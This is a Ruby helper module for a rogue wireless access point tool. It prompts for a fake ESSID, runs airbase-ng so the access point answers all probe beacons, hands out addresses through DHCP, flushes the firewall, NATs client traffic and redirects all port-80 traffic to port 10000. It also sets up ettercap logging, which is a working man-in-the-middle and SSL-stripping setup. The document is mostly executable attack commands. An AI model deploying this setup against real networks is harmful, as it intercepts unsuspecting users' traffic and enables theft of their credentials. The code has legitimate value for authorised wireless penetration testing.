require 'tempfile'
require 'erb'

module LurkerHelpers
  
  def lurker_setup config
    @config = config
    @log_dir= config[:log_dir] || 'logs'
    
    @iface = get_config(:iface, "Enter the name of the interface connected to the internet")
    @wiface = get_config(:wiface, "Enter your wireless interface name")
    @essid = get_config(:essid, "Enter the ESSID you would like your rogue AP to be called")
    @dry = config[:dry_run]
    Dir.mkdir @log_dir unless File.exists? @log_dir
    @execution_time = "#{Time.now.month}.#{Time.now.day}.#{Time.now.year}.#{Time.now.hour}.#{Time.now.min}.#{Time.now.sec}"
    @airbase_log = File.join(@log_dir,"airbase.#{@execution_time}.log")
    @ettercap_log = File.join(@log_dir,"ettercap.#{@execution_time}.log")
    puts @gateway_ip 
    @gateway_ip =  get_config(:gateway_ip, "Enter your gateway IP")
    @gateway_substr = @gateway_ip.split(".")[0..2].join(".")
    @seed = @gateway_ip.split(".").last.to_i > 150 ? 0 : 150
    @start_range =  @gateway_substr + ".#{@seed}"
    @end_range =  @gateway_substr + ".#{@seed + 100}"
    @respond_to_all_beacons = get_config(:respond_to_all, "Would you like to set the respond to all flag")
    
    if @respond_to_all_beacons 
      config[:aircrack_args] ||= "-P -C 30"
      @airbase_variables = get_config(:aircrack_args, "What aircrack_args should be used?")
    else
       @airbase_variables = ""
    end
    @process_tracker = Hash.new
  end
  
  def get_config item, msg
    return @config[item] unless @config[:interactive]
    puts "#{msg} (Default: #{@config[item]}) > "
    result = STDIN.gets
    result.strip.empty? ? @config[item] : result
  end
  
  def dhcp_setup
    puts "Import the dhcpd.conf to assign addresses to clients that connect to us"
    File.open('dhcpd.conf', "w") do |f|
    	f.puts "default-lease-time 600;"

    	f.puts "max-lease-time 720;"
    	f.puts "ddns-update-style none;"
    	f.puts "authoritative;"
    	f.puts "log-facility local7;"
    	f.puts "subnet #{@gateway_substr}.0/24 netmask 255.255.255.0 {"
    	f.puts "range #{@start_range} #{@end_range};"
    	f.puts "option routers #{@gateway_ip};"
    	f.puts "option domain-name-servers #{@gateway_ip};"
    	f.puts "}"
    end
  end
  
  def interface_setup
    puts "Configuring ip forwarding"
    if @dry
      puts %|File.open("/proc/sys/net/ipv4/ip_forward", "w"){\|f\| f.puts 1}|
    else
      File.open("/proc/sys/net/ipv4/ip_forward", "w"){|f| f.puts 1}
    end
    puts "Network Interfaces:"
#    lurk_execute "ifconfig | grep Link"
#    lurk_execute "ifconfig #{@wiface} down"
  end
  
  def wiface_setup
    lurk_execute "ifconfig #{@wiface} up"
    lurk_execute "iwconfig #{@wiface} chan 6"
    lurk_execute "iwconfig mon0 chan 6"
  end

  def gateway_setup
    puts "Configuring interface created by airbase-ng"
    lurk_execute "ifconfig at0 up"
    puts @gateway_ip
	  lurk_execute "ifconfig at0 #{@gateway_ip} netmask 255.255.255.0"
    lurk_execute "ifconfig at0 mtu 1400"
    lurk_execute "route -v del -net #{@gateway_substr}.0/24 gw 0.0.0.0"
    lurk_execute "route -v add -net #{@gateway_substr}.0/24 gw #{@gateway_ip}"

  end

  def iptables_setup
    puts "Setting up iptables to handle traffic seen by the airdrop-ng (at0) interface"
    lurk_execute "iptables --flush"
    lurk_execute "iptables --table nat --flush"
    lurk_execute "iptables --delete-chain"
    lurk_execute "iptables --table nat --delete-chain"
    lurk_execute "iptables --table nat --delete-chain"
    lurk_execute "iptables -P FORWARD ACCEPT"
    lurk_execute "iptables -t nat -A POSTROUTING -o #{@iface} -j MASQUERADE"
    lurk_execute "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"
  end
  
  def lurk_execute command
    if @dry
      puts command
    else
      system command
    end
  end
  
end
